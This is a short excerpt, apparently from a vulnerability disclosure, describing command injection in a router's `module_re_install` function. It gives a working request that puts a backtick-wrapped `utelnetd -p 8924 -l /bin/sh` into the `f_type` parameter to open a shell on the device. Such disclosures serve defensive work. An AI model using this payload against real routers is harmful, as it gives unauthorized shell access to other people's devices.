...
In `module_re_install` function, `f_type、module_sign_flag` is directly passed by the attacker, so we can control the `f_type、module_sign_flag` to attack the OS.
...
We set `f_type` as **`utelnetd -p 8924 -l /bin/sh`** , and the router will excute it,such as:
...
cmd=module_re_install&f_type=`utelnetd -p 8924 -l /bin/sh`&install_type=&module_sign_flag=
```
